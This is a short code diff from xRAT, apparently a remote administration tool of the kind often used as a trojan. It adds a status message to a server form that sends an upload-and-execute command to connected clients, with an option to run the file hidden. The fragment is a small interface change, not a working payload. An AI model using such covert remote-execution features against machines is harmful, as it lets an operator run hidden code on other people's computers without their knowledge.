@@ -449,6 +449,7 @@ namespace xRAT_2.Forms
                             {
                                 Client c = (Client)lvi.Tag;
                                 new Core.Packets.ServerPackets.UploadAndExecute(UploadAndExecute.File, UploadAndExecute.FileName, UploadAndExecute.RunHidden).Execute(c);
+                                CommandHandler.HandleStatus(c, new Core.Packets.ClientPackets.Status("Uploading file..."), this);
                             }
                         }
                     }
